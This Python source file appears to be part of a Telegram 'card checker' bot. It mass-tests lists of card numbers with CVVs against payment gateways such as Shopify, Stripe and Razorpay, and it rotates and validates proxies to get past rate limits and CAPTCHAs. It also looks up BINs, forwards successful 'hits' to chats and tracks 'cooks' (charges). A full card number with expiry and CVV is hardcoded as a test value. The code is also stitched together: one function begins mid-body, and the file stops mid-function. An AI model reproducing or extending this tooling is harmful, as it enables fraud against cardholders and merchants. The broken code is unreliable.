#!/usr/bin/env python3
# complete_handler.py – Per‑gate proxy pools, clean proxy tests, mass checks with raw status.

import requests, time, threading, random, logging, re, csv, os, urllib3, traceback, json, base64, html, hashlib
import queue as _queue
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FutureTimeoutError
from telebot import types
from datetime import datetime, date

from gates import (
    check_shopify_api,
    process_shopify_api_response,
    check_stripe_api,
    check_stripe_auth,
    _pick_proxy, 
    check_paypal_charge,
    check_stripe5,
    check_authorize_net,
    check_braintree_b3,
    check_paypal_fixed, check_paypal_general, check_paypal_onyx,
    check_chaos, check_adyen, check_app_auth, check_stripe_onyx,
    check_arcenus, check_stripe_working, check_payflow, check_random,
    check_shopify_onyx, check_skrill, check_random_stripe,
    check_razorpay, check_payu, check_sk_gateway, check_braintree_api,
    check_midasbuy,
    check_vbv_lookup,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OWNER_ID = [5963548505, 5547897619]

# ============================================================================
# FREE GROUP CONFIGURATION
# ============================================================================
FREE_GROUP_ID = -1003926435438   # The group where free features apply

# ============================================================================
# GLOBAL PLACEHOLDERS – set by setup_complete_handler (from app.py)
# ============================================================================
is_user_allowed = lambda uid: False
load_json_func = lambda key, default: default
save_json_func = lambda key, data: None
users_file = "users.json"
user_sessions = {}

# Global cooldown for sites that gave CAPTCHA (shared across all mass checks)
CAPTCHA_COOLDOWN = {}
CAPTCHA_COOLDOWN_LOCK = threading.Lock()
CAPTCHA_COOLDOWN_SECONDS = 180   # 30 minutes

# ============================================================================
# RATE LIMITER
# ============================================================================
class RateLimiter:
    def __init__(self, max_calls=25, period=1.0):
        self.max_calls = max_calls
        self.period = period
        self.calls = []
        self.lock = threading.Lock()
    def wait(self):
        with self.lock:
            now = time.time()
            self.calls = [t for t in self.calls if t > now - self.period]
            if len(self.calls) >= self.max_calls:
                sleep_time = self.calls[0] + self.period - now
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.calls.append(time.time())
rate_limiter = RateLimiter()

from telebot.apihelper import ApiTelegramException
def safe_send(bot_func, *args, **kwargs):
    rate_limiter.wait()
    max_retries = 3
    for attempt in range(max_retries):
        try:
            return bot_func(*args, **kwargs)
        except ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = e.result_json.get('parameters', {}).get('retry_after', 5)
                sleep_time = min(retry_after, 10)
                logging.warning(f"Rate limited (429). Waiting {sleep_time}s (capped from {retry_after})")
                time.sleep(sleep_time)
                rate_limiter.wait()
                continue
            elif e.error_code in [400, 403]:
                logging.warning(f"Ignored Telegram API Error: {e.description}")
                return None
            else:
                raise
    return None


import concurrent.futures as _cf

# Global reusable pool — created once, never leaked
_HARD_CAP_POOL = _cf.ThreadPoolExecutor(max_workers=200)

def _hard_cap(fn, *args, timeout=30, default=False, **kwargs):
    """Timeout via future.result — no thread leak (pool is reused)."""
    try:
        fut = _HARD_CAP_POOL.submit(fn, *args, **kwargs)
        try:
            return fut.result(timeout=timeout)
        except _cf.TimeoutError:
            return default
        except Exception:
            return default
    except Exception:
        return default

# ============================================================================
# UNIVERSAL PROXY PARSER
# Accepts every common format → normalizes to "host:port:user:pass" or "host:port"
# ============================================================================
import re as _re_px

_PX_SCHEME_RE = _re_px.compile(
    r'^(https?|socks4|socks5|socks5h|socks)://(.+)$', _re_px.IGNORECASE
)
_PX_HOSTPORT_RE = _re_px.compile(r'^([\w.\-]+):(\d{1,5})$')
_PX_IP_RE = _re_px.compile(r'^(\d{1,3}(?:\.\d{1,3}){3})$')


def _px_scheme_to_protocol(scheme: str) -> str:
    s = scheme.lower()
    if s == 'socks':
        return 'socks5'
    return s


def _px_valid_port(p: str) -> int:
    try:
        n = int(p)
    except (ValueError, TypeError):
        return 0
    return n if 0 < n < 65536 else 0


def _px_is_ipv4(s: str) -> bool:
    return bool(_PX_IP_RE.match(s))


def _px_is_hostish(s: str) -> bool:
    """Hostname, IPv4, or domain-looking token."""
    if not s or len(s) > 253:
        return False
    if _px_is_ipv4(s):
        return True
    # must contain a dot OR be a bare hostname (no spaces, no colons, no @)
    if any(c in s for c in ' \t\r\n:@/'):
        return False
    return True


def normalize_proxy(p):
    """
    Universal proxy normalizer.
    Returns "host:port" or "host:port:user:pass" or None.

    Handles all of:
      IP:Port
      IP:Port:User:Pass
      User:Pass:IP:Port
      IP:Port@User:Pass
      User:Pass@IP:Port
      http://IP:Port
      http://User:Pass@IP:Port
      https://User:Pass@IP:Port
      socks4://IP:Port
      socks4://User:Pass@IP:Port
      socks5://IP:Port
      socks5://User:Pass@IP:Port
      socks5h://User:Pass@IP:Port
      Hostname:Port
      Hostname:Port:User:Pass
      User:Pass:Hostname:Port
      http://User:Pass@Hostname:Port
    """
    if not p or not isinstance(p, str):
        return None

    # strip whitespace, inline comments, surrounding quotes
    s = p.strip().strip('"').strip("'").strip()
    for sep in (' #', ' //', '\t#', ' ;'):
        if sep in s:
            s = s.split(sep)[0].strip()
    if not s or s.startswith('#'):
        return None

    protocol = 'http'

    # ---- 1) scheme prefix ----
    m = _PX_SCHEME_RE.match(s)
    if m:
        protocol = _px_scheme_to_protocol(m.group(1))
        s = m.group(2).strip()

    # ---- 2) @ separator forms ----
    if '@' in s:
        left, right = s.rsplit('@', 1)
        left, right = left.strip(), right.strip()

        # figure out which side is host:port and which is creds
        def _split_hostport(x):
            if ':' not in x:
                return None
            h, _, pt = x.rpartition(':')
            pt_n = _px_valid_port(pt)
            if pt_n and _px_is_hostish(h):
                return h, pt_n
            return None

        hp_right = _split_hostport(right)
        hp_left  = _split_hostport(left)

        if hp_right:                      # creds@host:port
            host, port = hp_right
            if ':' in left:
                u, _, pw = left.partition(':')
                return f"{host}:{port}:{u}:{pw}"
            return f"{host}:{port}"

        if hp_left:                       # host:port@creds
            host, port = hp_left
            if ':' in right:
                u, _, pw = right.partition(':')
                return f"{host}:{port}:{u}:{pw}"
            return f"{host}:{port}"

        return None  # malformed @-form

    # ---- 3) colon-separated, no scheme, no @ ----
    parts = s.split(':')

    if len(parts) == 2:                   # host:port
        host, port_s = parts
        port = _px_valid_port(port_s)
        if port and _px_is_hostish(host):
            return f"{host}:{port}"
        return None

    if len(parts) == 4:
        a, b, c, d = parts
        a, b, c, d = a.strip(), b.strip(), c.strip(), d.strip()

        b_port = _px_valid_port(b)
        d_port = _px_valid_port(d)

        # IP:Port:User:Pass  (b is port)
        if b_port and _px_is_hostish(a):
            return f"{a}:{b_port}:{c}:{d}"

        # User:Pass:IP:Port  (d is port)
        if d_port and _px_is_hostish(c):
            return f"{c}:{d_port}:{a}:{b}"

        return None

    # ---- 4) odd cases (bare host or 3-part) ----
    if len(parts) == 3:
        # host:port:something — treat as malformed, skip
        return None

    if len(parts) == 1:
        # bare IP/hostname with no port — reject (can't use without port)
        return None

    return None

# ============================================================================
# BACKGROUND HIT SENDER
# ============================================================================
_hit_queue = _queue.Queue()
_hit_sender_started = False
_hit_sender_lock = threading.Lock()
_hit_sender_bot = None

def _hit_sender_worker():
    global _hit_sender_bot
    while True:
        try:
            target_chat, msg = _hit_queue.get(timeout=120)
            if _hit_sender_bot:
                safe_send(_hit_sender_bot.send_message, target_chat, msg, parse_mode='HTML')
        except _queue.Empty:
            continue
        except Exception as e:
            logging.warning(f"Hit sender error: {e}")

def queue_hit(bot, target_chat, msg):
    global _hit_sender_started, _hit_sender_bot
    with _hit_sender_lock:
        _hit_sender_bot = bot
        if not _hit_sender_started:
            t = threading.Thread(target=_hit_sender_worker, daemon=True)
            t.start()
            _hit_sender_started = True
    _hit_queue.put((target_chat, msg))

# ============================================================================
# STOP COMMAND HANDLING
# ============================================================================
stop_events = {}
stop_lock = threading.Lock()

def get_stop_key(chat_id, user_id):
    return f"{chat_id}:{user_id}"

def set_stop(chat_id, user_id):
    with stop_lock:
        key = get_stop_key(chat_id, user_id)
        stop_events[key] = True

def clear_stop(chat_id, user_id):
    with stop_lock:
        key = get_stop_key(chat_id, user_id)
        stop_events.pop(key, None)

def is_stop_requested(chat_id, user_id):
    with stop_lock:
        key = get_stop_key(chat_id, user_id)
        return stop_events.get(key, False)


def _quick_alive(proxy, timeout=8):
    """Cheap TCP/HTTP test. Kills dead proxies in <4s."""
    try:
        parts = proxy.strip().split(':')
        if len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            return False
        r = requests.get(
            "http://api.ipify.org",
            proxies={"http": url, "https": url},
            timeout=timeout, verify=False
        )
        return r.status_code == 200
    except Exception:
        return False

# ============================================================================
# CONCURRENCY CONTROL
# ============================================================================
user_busy = {}
user_busy_lock = threading.Lock()
BUSY_TIMEOUT = 600
def is_user_busy(user_id):
    with user_busy_lock:
        entry = user_busy.get(user_id)
        if not entry:
            return False
        if entry['busy'] and time.time() - entry['since'] > BUSY_TIMEOUT:
            user_busy[user_id] = {'busy': False, 'since': 0}
            return False
        return entry['busy']
def set_user_busy(user_id, busy):
    with user_busy_lock:
        user_busy[user_id] = {'busy': busy, 'since': time.time() if busy else 0}
MAX_CONCURRENT_CHECKS = 30
mass_check_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKS)

# ============================================================================
# PROXY CACHE – FAST VALIDATION (Google connectivity)
# ============================================================================
proxy_cache = {}
proxy_cache_lock = threading.Lock()
PROXY_CACHE_TTL = 600  # 10 minutes

def validate_proxies_strict(proxies, bot, message):
    """
    FAST proxy validation using Google connectivity test (5s timeout, 100 threads).
    Shows progress updates every few seconds so user knows it's working.
    """
    if not proxies:
        return []

    # Deduplicate
    proxies = list(dict.fromkeys(proxies))
    total = len(proxies)

    live_proxies = []
    now = time.time()
    to_test = []

    # Check cache first
    with proxy_cache_lock:
        for p in proxies:
            if p in proxy_cache and now - proxy_cache[p]['time'] < PROXY_CACHE_TTL:
                if proxy_cache[p]['live']:
                    live_proxies.append(p)
            else:
                to_test.append(p)

    if not to_test:
        return live_proxies

    # Send initial status message
    status_msg = safe_send(bot.send_message, message.chat.id,
        f"🛡️ Verifying {len(to_test)} proxies... (cached: {len(live_proxies)})",
        parse_mode='HTML')
    tested = 0
    newly_live = []
    lock = threading.Lock()
    last_update = time.time()

    def test_proxy_connectivity(proxy):
        """Test proxy with Google (fast, reliable)"""
        try:
            parts = proxy.strip().split(':')
            if len(parts) == 2:
                proxy_url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                return False
            proxies_dict = {'http': proxy_url, 'https': proxy_url}
            # Use a fast, reliable endpoint
            r = requests.get("https://www.google.com", proxies=proxies_dict, timeout=5, verify=False)
            return r.status_code == 200
        except:
            return False

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(test_proxy_connectivity, p): p for p in to_test}
        for future in as_completed(futures):
            p = futures[future]
            tested += 1
            ok = future.result()
            with lock:
                if ok:
                    newly_live.append(p)
                # Update cache
                with proxy_cache_lock:
                    proxy_cache[p] = {'live': ok, 'time': now}
            # Update progress every 2 seconds or every 50 proxies
            now_time = time.time()
            if (now_time - last_update >= 2) or (tested % 50 == 0) or (tested == len(to_test)):
                try:
                    safe_send(bot.edit_message_text,
                        f"🛡️ Verifying proxies: {tested}/{len(to_test)}\n✅ Live: {len(live_proxies)+len(newly_live)}",
                        message.chat.id, status_msg.message_id, parse_mode='HTML')
                    last_update = now_time
                except:
                    pass

    # Delete status message
    if status_msg:
        safe_send(bot.delete_message, message.chat.id, status_msg.message_id)

    live_proxies.extend(newly_live)
    return live_proxies

# ============================================================================
# LOGGING
# ============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)

# ============================================================================
# BIN DATABASE
# ============================================================================
BINS_CSV_FILE = 'bins_all.csv'
BIN_DB = {}
_bin_cache = {}
_bin_cache_lock = threading.Lock()

def load_bin_database():
    global BIN_DB
    if not os.path.exists(BINS_CSV_FILE):
        return
    try:
        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            next(reader, None)
            for row in reader:
                if len(row) >= 6:
                    BIN_DB[row[0].strip()] = {
                        'country_name': row[1].strip(),
                        'country_flag': get_flag_emoji(row[1].strip()),
                        'brand': row[2].strip(),
                        'type': row[3].strip(),
                        'level': row[4].strip(),
                        'bank': row[5].strip()
                    }
    except Exception as e:
        logger.error(f"Error loading BIN CSV: {e}")
def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])
load_bin_database()

def get_bin_info(card_number):
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]

    with _bin_cache_lock:
        if bin_code in _bin_cache:
            return _bin_cache[bin_code]

    result = None
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            result = {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass

    if not result:
        result = BIN_DB.get(bin_code, {
            'country_name': 'Unknown', 'country_flag': '🇺🇳',
            'bank': 'UNKNOWN', 'brand': 'UNKNOWN',
            'type': 'UNKNOWN', 'level': 'UNKNOWN'
        })

    with _bin_cache_lock:
        _bin_cache[bin_code] = result

    return result

def extract_cards_from_text(text):
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15: continue
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2: yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def format_progress_bar(processed, total, length=12):
    if total == 0: return ""
    percent = processed / total
    filled = int(length * percent)
    bar = '█' * filled + '▒' * (length - filled)
    return f"<code>{bar}</code> <b>{processed}/{total}</b>"

# ============================================================================
# EXPIRED CARD FILTER
# ============================================================================
def remove_expired_cards(ccs):
    valid_ccs = []
    now = datetime.now()
    current_year = now.year
    current_month = now.month

    for cc_str in ccs:
        try:
            parts = cc_str.split('|')
            if len(parts) < 4: continue
            cc, mm, yyyy, cvv = parts[0], parts[1], parts[2], parts[3]
            month = int(mm)
            year = int(yyyy)
            if year < 100:
                year += 2000
            if year > current_year or (year == current_year and month >= current_month):
                valid_ccs.append(cc_str)
        except ValueError:
            continue
    return valid_ccs

# ============================================================================
# USAGE TRACKING
# ============================================================================
def reset_usage_if_needed(user_data):
    today = date.today().isoformat()
    if user_data.get('last_usage_reset') != today:
        user_data['usage_today'] = 0
        user_data['last_usage_reset'] = today
def get_user_upload_limit(user_id, load_json_func, users_file):
    users_data = load_json_func(users_file, {})
    user_info = users_data.get(str(user_id), {})
    return user_info.get('limit', 50000)
def get_user_daily_remaining(user_id, load_json_func, users_file):
    users_data = load_json_func(users_file, {})
    user_info = users_data.get(str(user_id), {})
    if not user_info:
        return 100000
    reset_usage_if_needed(user_info)
    daily_limit = user_info.get('daily_limit', 100000)
    used = user_info.get('usage_today', 0)
    return max(0, daily_limit - used)
def increment_usage(user_id, amount, load_json_func, save_json_func, users_file):
    users_data = load_json_func(users_file, {})
    user_info = users_data.get(str(user_id))
    if not user_info:
        return
    reset_usage_if_needed(user_info)
    user_info['usage_today'] = user_info.get('usage_today', 0) + amount
    save_json_func(users_file, users_data)

# ============================================================================
# USER PREFERENCES
# ============================================================================
USER_PREFS_FILE = "user_prefs.json"
def load_user_prefs():
    try:
        with open(USER_PREFS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}
def save_user_prefs(prefs):
    with open(USER_PREFS_FILE, 'w') as f:
        json.dump(prefs, f, indent=2)
def get_user_preference(user_id):
    prefs = load_user_prefs()
    return prefs.get(str(user_id), "individual")
def set_user_preference(user_id, mode):
    prefs = load_user_prefs()
    prefs[str(user_id)] = mode
    save_user_prefs(prefs)

# ============================================================================
# PERSONAL SITES
# ============================================================================
USER_SITES_FILE = "user_sites.json"
def load_user_sites():
    try:
        with open(USER_SITES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}
def save_user_sites(data):
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(data, f, indent=2)
def get_user_sites(user_id):
    data = load_user_sites()
    return data.get(str(user_id), [])
def save_user_sites_list(user_id, sites_list):
    data = load_user_sites()
    data[str(user_id)] = sites_list
    save_user_sites(data)

# ============================================================================
# PROXY MANAGEMENT – PER GATE
# ============================================================================
def _migrate_old_proxy_data():
    user_proxies = load_json_func("user_proxies.json", {})
    changed = False
    for uid, data in user_proxies.items():
        if isinstance(data, list):
            user_proxies[uid] = {"shopify": data, "razorpay": []}
            changed = True
    if changed:
        save_json_func("user_proxies.json", user_proxies)

    global_proxies = load_json_func("proxies.json", [])
    if isinstance(global_proxies, list):
        save_json_func("proxies.json", {"shopify": global_proxies, "razorpay": []})
    elif isinstance(global_proxies, dict) and ("shopify" not in global_proxies or "razorpay" not in global_proxies):
        global_proxies.setdefault("shopify", global_proxies.get("shopify", []))
        global_proxies.setdefault("razorpay", [])
        save_json_func("proxies.json", global_proxies)

_migrate_old_proxy_data()

def get_user_proxies(user_id):
    user_id_str = str(user_id)
    user_proxies = load_json_func("user_proxies.json", {})
    data = user_proxies.get(user_id_str, {})
    if isinstance(data, list):
        data = {"shopify": data, "razorpay": []}
        user_proxies[user_id_str] = data
        save_json_func("user_proxies.json", user_proxies)
    data.setdefault("shopify", [])
    data.setdefault("razorpay", [])
    return data

def save_user_proxies(user_id, proxies_dict):
    user_id_str = str(user_id)
    user_proxies = load_json_func("user_proxies.json", {})
    user_proxies[user_id_str] = proxies_dict
    save_json_func("user_proxies.json", user_proxies)

def add_proxy_to_user(user_id, proxy, gate_type):
    data = get_user_proxies(user_id)
    if gate_type not in data:
        data[gate_type] = []
    if proxy not in data[gate_type]:
        data[gate_type].append(proxy)
        save_user_proxies(user_id, data)
        return True
    return False

def get_global_proxies(gate_type):
    global_data = load_json_func("proxies.json", {"shopify": [], "razorpay": []})
    return global_data.get(gate_type, [])

def add_global_proxy(proxy, gate_type):
    global_data = load_json_func("proxies.json", {"shopify": [], "razorpay": []})
    if gate_type not in global_data:
        global_data[gate_type] = []
    if proxy not in global_data[gate_type]:
        global_data[gate_type].append(proxy)
        save_json_func("proxies.json", global_data)
        return True
    return False

def get_active_proxies(user_id, gate_type="shopify"):
    user_proxies = get_user_proxies(user_id)
    personal = user_proxies.get(gate_type, [])

    if personal:
        return personal

    # Get global proxies – first try gate-specific, then fallback to 'proxies'
    global_data = get_global_proxies(gate_type)
    if global_data:
        return global_data

    # If gate-specific empty, try to load the entire file and get 'proxies' key
    raw = load_json_func("proxies.json", {"shopify": [], "razorpay": []})
    fallback = raw.get('proxies', [])
    if fallback:
        return fallback

    if isinstance(raw, dict) and 'proxies' in raw:
        return raw['proxies']

    return []

# ============================================================================
# PROXY TESTERS – Shopify & Razorpay
# ============================================================================

def test_proxy_for_shopify(proxy, test_cc="5242430428405662|03|28|323"):
    """
    Full checkout test — accept ONLY if real decline/approval marker present.
    Rejects: captcha, 429, 403, timeout, generic errors, unknown responses.
    ~15s worst case per proxy.
    """
    proxy = normalize_proxy(proxy)
    if not proxy:
        return False

    # Stage 1: fast connectivity first
    if not _quick_alive(proxy, timeout=5):
        return False

    sites = get_filtered_sites_func()
    if not sites:
        return False

    # One site only — fastest path
    site_obj = random.choice(sites)
    site = site_obj['url']

    try:
        api_resp = _hard_cap(
            check_shopify_api, site, test_cc, proxy,
            timeout=60, default=None
        )
        if not api_resp or not isinstance(api_resp, dict):
            return False

        status = str(api_resp.get('status', '')).upper()
        msg = str(api_resp.get('Response', '')).upper()
        resp_upper = msg

        # ── REJECT: captcha ──
        if 'CAPTCHA' in resp_upper or api_resp.get('captcha_required'):
            return False

        # ── REJECT: rate limited ──
        if any(k in resp_upper for k in (
            '429', 'RATE LIMIT', 'RATE_LIMITED', 'TOO MANY REQUESTS'
        )):
            return False

        # ── REJECT: proxy errors ──
        if any(k in resp_upper for k in (
            '503', '502', 'CONNECTION REFUSED', 'TIMEOUT',
            'CONNECT TUNNEL FAILED', 'PROXY ERROR', 'UNREACHABLE'
        )):
            return False

        # ── REJECT: generic errors / product fetch failed ──
        if any(k in resp_upper for k in (
            'API ERROR', 'PRODUCT FETCH FAILED', 'NO PRODUCT',
            'SITE NOT FOUND', 'NOT A SHOPIFY', 'SYSTEM ERROR'
        )):
            return False

        # ── ACCEPT: real gateway decline markers ──
        decline_markers = [
            'CARD_DECLINED',
            'CARD DECLINED',
            'FRAUD_SUSPECTED',
            'FRAUD SUSPECTED',
            'INSUFFICIENT_FUNDS',
            'INSUFFICIENT FUNDS',
            'INCORRECT_CVC',
            'INCORRECT CVC',
            'INCORRECT_ZIP',
            'INCORRECT ZIP',
            'DO_NOT_HONOR',
            'DO NOT HONOR',
            'EXPIRED_CARD',
            'EXPIRED CARD',
            'CARD_EXPIRED',
            'LOST_CARD',
            'STOLEN_CARD',
            'PICK_UP_CARD',
            'TRANSACTION_NOT_ALLOWED',
            'CALL_ISSUER',
            'PAYMENT_FAILED',
            'GENERIC_ERROR',
            'PROCESSING_ERROR',
            'PAYMENTS_CREDIT_CARD_BASE_GENERIC',
        ]
        if any(k in resp_upper for k in decline_markers):
            return True

        # ── ACCEPT: real approvals (rare for test cards, but if seen, proxy works) ──
        if 'ORDER_PLACED' in resp_upper or 'CHARGED' in resp_upper:
            return True
        if status in ('APPROVED', 'APPROVED_OTP'):
            return True

        # ── 3DS challenge = proxy reaches gateway ──
        if any(k in resp_upper for k in (
            '3DS', '3D_SECURE', '3DS_AUTHENTICATION',
            'AUTHENTICATION_REQUIRED', 'OTP_REQUIRED'
        )):
            return True

        # ── Anything else = reject ──
        return False

    except Exception:
        return False

def test_proxy_for_razorpay(proxy, test_cc="5242430428405662|03|28|323"):
    """Real Razorpay response only — no generic errors."""
    proxy = normalize_proxy(proxy)
    if not proxy:
        return False

    if not _quick_alive(proxy, timeout=5):
        return False

    sites = load_rz_sites()
    if not sites:
        return False

    site = random.choice(sites)

    try:
        result = _hard_cap(
            check_razorpay, test_cc, proxy, site,
            timeout=15, default=None
        )
        if not result or not isinstance(result, tuple) or len(result) != 2:
            return False

        msg, status = result
        msg_up = str(msg).upper()

        # Reject captcha / rate limit / blocks
        if any(k in msg_up for k in ('CAPTCHA', '429', 'BLOCKED', 'CHALLENGE')):
            return False

        # Accept only real declines or approvals
        if status in ('DECLINED', 'APPROVED'):
            # But confirm it's a real Razorpay response, not a generic error
            if any(k in msg_up for k in (
                'CONNECTION', 'TIMEOUT', 'UNREACHABLE', 'REFUSED',
                'API ERROR', 'NOT FOUND'
            )):
                return False
            return True

        return False

    except Exception:
        return False

# ============================================================================
# INLINE STOP BUTTON
# ============================================================================
def stop_button_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⏹ Stop", callback_data="stop_mass"))
    return markup

# ============================================================================
# PROXY RETRY HELPER
# ============================================================================
def gate_with_proxy_retry(gate_func, cc, proxies, gate_name="", max_retries=3):
    available = list(proxies)
    last_error = None
    for attempt in range(max_retries):
        if not available:
            break
        proxy = random.choice(available)
        try:
            result = gate_func(cc, proxy=proxy)
            if isinstance(result, tuple) and len(result) == 2:
                msg, status = result
            else:
                msg, status = str(result), "ERROR"

            error_keywords = [
                "proxy error", "503", "service unavailable",
                "server disconnected", "timeout", "connection refused",
                "failed to get session token", "site error! status: 402",
                "error processing card", "api error", "not shopify",
                "proxy error: 503", "remote end closed",
                "could not connect", "no route to host"
            ]
            if status == "ERROR" and any(kw in msg.lower() for kw in error_keywords):
                if proxy in available:
                    available.remove(proxy)
                last_error = msg
                continue
            return msg, status, proxy
        except Exception as e:
            if proxy in available:
                available.remove(proxy)
            last_error = str(e)
            continue
    error_detail = (last_error[:80] if last_error else "no proxies available")
    return f"All proxies failed (last: {error_detail})", "ERROR", None

# ============================================================================
# RAZORPAY SITE STORAGE
# ============================================================================
RZ_SITES_KEY = "rz_sites.json"
RZ_FAIL_COUNTS_KEY = "rz_fail_counts.json"

def load_rz_sites():
    return load_json_func(RZ_SITES_KEY, [])

def save_rz_sites(sites):
    save_json_func(RZ_SITES_KEY, sites)

def load_rz_fail_counts():
    return load_json_func(RZ_FAIL_COUNTS_KEY, {})

def save_rz_fail_counts(counts):
    save_json_func(RZ_FAIL_COUNTS_KEY, counts)

def increment_rz_fail_count(site):
    counts = load_rz_fail_counts()
    counts[site] = counts.get(site, 0) + 1
    save_rz_fail_counts(counts)
    if counts[site] >= 3:
        sites = load_rz_sites()
        if site in sites:
            sites.remove(site)
            save_rz_sites(sites)
            return True
    return False

def reset_rz_fail_count(site):
    counts = load_rz_fail_counts()
    if site in counts:
        del counts[site]
    save_rz_fail_counts(counts)

# ============================================================================
# RAZORPAY SITE VALIDATION
# ============================================================================
def is_valid_razorpay_url(url):
    import re
    url = url.strip()
    return bool(re.match(r'^https?://razorpay\.me/@[a-zA-Z0-9_\-]+$', url) or
                re.match(r'^https?://pages\.razorpay\.com/[a-zA-Z0-9_\-]+(/view)?$', url) or
                re.match(r'^https?://pages\.razorpay\.com/pl_[a-zA-Z0-9]+(/view)?$', url))

def validate_razorpay_site(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(url, timeout=10, verify=False, proxies=proxies)
        if resp.status_code != 200:
            return False, f"HTTP {resp.status_code}"
        html = resp.text
        if '"key_id"' in html or '"key"' in html or 'rzp' in html.lower():
            return True, "Valid Razorpay page"
        return False, "No Razorpay key found"
    except Exception as e:
        return False, str(e)

# ============================================================================
# SAFE PROGRESS UPDATE HELPER
# ============================================================================
def safe_update_progress(bot, chat_id, status_msg, msg_text):
    if status_msg is None:
        new_msg = safe_send(bot.send_message, chat_id, msg_text,
                            parse_mode="HTML", reply_markup=stop_button_markup())
        return new_msg if new_msg else status_msg
    try:
        safe_send(bot.edit_message_text, msg_text, chat_id, status_msg.message_id,
                  parse_mode="HTML", reply_markup=stop_button_markup())
        return status_msg
    except Exception:
        new_msg = safe_send(bot.send_message, chat_id, msg_text,
                            parse_mode="HTML", reply_markup=stop_button_markup())
        return new_msg if new_msg else status_msg

# ============================================================================
# SHOPIFY MASS CHECK – uses raw status from gate (no re‑classification)
# ===========================================================================


        e = _get_site_live(site_url)
        e['probes_sent'] = e.get('probes_sent', 0) + 1
        n = e['probes_sent']
    return (n % FAKE_LUHN_PROBE_EVERY_N) == 0


def _run_luhn_probe_on_site(site_obj, proxy, check_api_func, process_func):
    site_url = site_obj['url']
    import random as _r
    probe = _luhn_bad_probe() if _r.random() < 0.6 else _expired_probe()
    try:
        api_resp = check_api_func(site_url, probe, proxy)
        response_text, raw_status, _ = process_func(api_resp, site_obj.get('price', '0.00'))
        up = response_text.upper()
        if 'ORDER_PLACED' in up or 'CHARGED' in up or raw_status == 'APPROVED':
            return True, f"Luhn probe approved → {response_text[:60]}"
        return False, f"probe rejected ({response_text[:40]})"
    except Exception as e:
        return False, f"probe error: {str(e)[:60]}"


# ============================================================================
# SHOPIFY MASS CHECK — full corrected version
# ============================================================================
# ============================================================================
# FAKE-SITE VELOCITY KILLER — module scope
# ============================================================================
import concurrent.futures as _cf

FAKE_VELOCITY_COUNT          = 4       # cooks within window = fake
FAKE_VELOCITY_WINDOW         = 60.0    # seconds
FAKE_BAN_SECONDS             = 86400   # 24h blacklist
CAPTCHA_SITE_BAN_SECONDS     = 180     # 3 min
CAPTCHA_PROXY_BAN_SECONDS    = 180     # 3 min
RATE_LIMIT_PROXY_BAN_SECONDS = 300     # 5 min
_API_HARD_TIMEOUT            = 60      # seconds per API call
OWNER_KILL_PING              = 5963548505

_site_cook_times = {}
_site_kill_lock  = threading.Lock()

_proxy_ban      = {}
_proxy_ban_lock = threading.Lock()


def _safe_api_call(fn, *args, timeout=_API_HARD_TIMEOUT, **kwargs):
    """Hard wall-clock timeout so no API call can hang the pool."""
    ex = _cf.ThreadPoolExecutor(max_workers=1)
    try:
        fut = ex.submit(fn, *args, **kwargs)
        try:
            return fut.result(timeout=timeout)
        except _cf.TimeoutError:
            return None
        except Exception:
            return None
    finally:
        ex.shutdown(wait=False, cancel_futures=True)


def _proxy_ban_set(proxy, seconds, reason=""):
    with _proxy_ban_lock:
        _proxy_ban[proxy] = {'until': time.time() + seconds, 'reason': reason}


def _proxy_is_banned(proxy):
    with _proxy_ban_lock:
        e = _proxy_ban.get(proxy)
        if not e:
            return False
        if e['until'] > time.time():
            return True
        del _proxy_ban[proxy]
        return False


def _observe_cook(site_url):
    """
    Register a cook for this site.
    Returns (killed, count) — killed=True if velocity threshold crossed.
    """
    now = time.time()
    with _site_kill_lock:
        times = _site_cook_times.get(site_url, [])
        cutoff = now - FAKE_VELOCITY_WINDOW
        times = [t for t in times if t >= cutoff]
        times.append(now)
        _site_cook_times[site_url] = times
        if len(times) >= FAKE_VELOCITY_COUNT:
            _site_cook_times[site_url] = []
            return True, len(times)
    return False, 0


def _remove_fake_site(bot, chat_id, site_obj, current_sites_ref, sites_lock):
    """
    Instant remove from live pool + blacklist + notify user + owner.
    No confirmation. No ban table lookups.
    """
    site_url = site_obj['url']
    site_id  = site_obj.get('id', '?')

